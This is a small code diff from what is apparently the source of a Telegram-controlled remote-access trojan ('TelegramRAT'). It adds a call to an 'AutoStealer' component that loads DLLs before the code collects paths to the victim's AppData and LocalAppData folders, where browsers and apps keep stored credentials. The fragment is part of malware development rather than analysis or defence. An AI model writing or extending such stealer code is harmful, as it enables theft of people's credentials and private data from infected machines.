@@ -16,6 +16,8 @@ namespace TelegramRAT
 
         public static void get()
         {
+            // loadDlls
+            AutoStealer.loadDlls();
             // Path info
             string a_a = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
             string l_a = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\";
